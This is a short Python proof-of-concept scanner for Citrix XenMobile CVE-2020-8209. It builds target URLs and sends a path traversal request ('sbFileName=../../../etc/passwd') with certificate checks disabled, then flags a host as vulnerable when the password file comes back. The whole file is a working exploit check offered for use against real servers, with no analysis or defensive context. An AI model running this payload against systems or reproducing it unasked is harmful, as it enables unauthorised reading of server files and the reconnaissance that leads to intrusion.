#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = carrypan

import requests
import urllib3

def poc(url):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
    payload= '/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd'
    portlist = ['21','22','23','25','53','110','137','161','389','445','873','1090','1099','1433','1521','2049','2181','2222','2375','3306','3389','5432','5901','5984','6379','11211','27017']    
    if url.split(':')[1] in portlist:
        return False
    elif int(url.split(':')[1]) == 443:
        url = 'https://' + url.split(':')[0]
    elif int(url.split(':')[1]) == 8443:
        url = 'https://' + url
    else:
        url = 'http://' + url
    
    url = url + payload
    try:
        requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
        response=requests.get(url,headers=headers,timeout=10,verify=False)
        if response.status_code==200 and "/root:/bin/" in response.content:
            return '[citrix xenmobile cve-2020-8209]\t' + url
        else:
            return False
    except:
        return False
